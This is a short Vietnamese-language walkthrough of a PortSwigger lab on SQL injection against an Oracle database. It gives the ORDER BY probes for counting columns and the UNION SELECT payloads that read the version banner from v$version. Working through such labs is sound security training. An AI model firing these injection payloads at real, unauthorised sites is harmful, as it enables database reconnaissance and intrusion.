# SQL injection attack, querying the database type and version on Oracle

Bài lab này yêu cầu ta kiểm tra phiên bản Oracle mà máy chủ  đang sử dụng.

Kiểm tra xem có bao nhiêu cột bên trong bảng:
- `' ORDER BY 1--`
- `' ORDER BY 2--`
- `' ORDER BY 3--` (tới đây thì sever error, vậy là chỉ có 2 cột trong bảng)

Tiếp theo ta kiểm tra xem kiểu dữ liệu bên trong từng cột của bảng:
- `' UNION SELECT 'ahihi','hehehe' FROM dual--` (mặc định bên trong Oracle luôn có bảng ảo `dual` )

![](https://github.com/Luwcj/SQLi/blob/main/Portswigger/SQL%20injection%20attack,%20querying%20the%20database%20type%20and%20version%20on%20Oracle/1.1.png?raw=true)

Vậy là cả hai cột đều có kiểu dữ liệu `string`(kiểu dữ liệu chuỗi cũng là kiểu dữ liệu diễn tả phiên bản oracle đang dùng)

Tiếp theo ta truy cập vào cột `BANNER` của bảng `v$version` :
- `' UNION SELECT NULL,BANNER FROM v$version--`

![](https://github.com/Luwcj/SQLi/blob/main/Portswigger/SQL%20injection%20attack,%20querying%20the%20database%20type%20and%20version%20on%20Oracle/1.2.png?raw=true)
